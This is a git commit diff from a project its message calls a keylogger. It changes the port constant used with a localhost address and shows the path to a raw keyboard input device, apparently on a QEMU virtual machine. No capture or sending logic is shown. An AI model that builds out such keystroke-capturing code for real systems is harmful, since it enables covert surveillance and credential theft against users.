e39e13f903ba9473955f0af2c91417ba2ddadb33
Deomorphisme <deo.gracias.edu@gmail.com>
2025-11-10 15:06:55 +0100

    fix: update PORT constant to match the correct value for keylogger

--- src/main.cpp
+++ src/main.cpp
@@ -4,7 +4,7 @@
 #include <string>
 
 const std::string IP_ADDRESS = "127.0.0.1";
-const std::string PORT = "5000";
+const std::string PORT = "1984";
 
 int main() {
     const char* device = "/dev/input/by-id/usb-QEMU_QEMU_USB_Keyboard_68284-0000:00:04.0-3-event-kbd";
